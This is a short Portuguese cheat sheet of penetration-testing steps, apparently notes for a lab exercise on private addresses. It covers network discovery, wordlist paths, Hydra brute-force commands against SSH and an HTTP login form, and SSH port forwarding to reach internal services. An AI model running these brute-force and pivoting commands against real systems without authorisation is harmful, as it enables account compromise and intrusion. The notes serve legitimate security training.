# COMANDOS E PASSOS IMPORTANTES

- verificar ip

  `ip -br -c a`

- verificar dispositivos conectados na mesma rede

  `netdiscover -i eth0 -P -r 192.168.56.0/24`

- verificar portas abertas

  `netstat -nltp`

  ## Caminhos de pastas importantes

  - WORDLISTS

  /usr/share/wordlists/metasploit

  http_default_user.txt

  http_default_pass.txt

  rockyou.txt

  ## Possivel passo a passo

  Entrar no servidor:

  por meio de usuário dado e ataque de força bruta

  - `hydra -L user.txt -P pass.txt ssh://192.168.10.10`

  ataque de força bruta sem nada

  - `hydra -L pass_user_injection.txt -P pass_user_injections.txt 192.168.100.20 http-post-form "/login.php:login=ÛSER^&senha=^PASS^:F=incorreto" -o found2.txt -f`

  Depois de descobrir fazer tunelamento ssh

  - `ssh -p 2222 aluno@192.168.100.20`

  Verificar serviços e portas abertas

  - serviço -> colocar ip do servidor no navegador
 
  - portas -> `netstat - nltp`

  - inspecionar página para ver se não encontra nada
 
  Se tiver outra porta aberta sera necessário fazer redirecionamento de portas local, então sair do servidor e:

  - `ssh -L portaLocal:localhost:portaRemota aluno@192.168.100.20`
 
    Depois de acessar a proxima porta tentar acessar o outro serviço colocando no navegador:

  - `localhost:portaRemota`

  OBS:
  - Tomar cuidado para que o proxy não esteja ligado
  - Tomar cuidado para não usar a mesma porta de um serviço ja usado
  
